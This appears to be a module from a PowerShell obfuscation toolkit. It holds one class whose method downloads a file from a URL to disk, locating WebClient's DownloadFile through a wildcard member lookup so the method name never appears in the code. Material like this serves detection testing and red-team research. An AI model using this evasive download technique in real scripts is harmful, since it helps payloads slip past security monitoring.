Class ObfDownloadFile7 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Method\3
        (New-Object Net.WebClient).((((New-Object Net.WebClient)|GM)|Where-Object{$_.Name-clike'Do*o*F*e'}).Name).Invoke($url,$path)
    }

}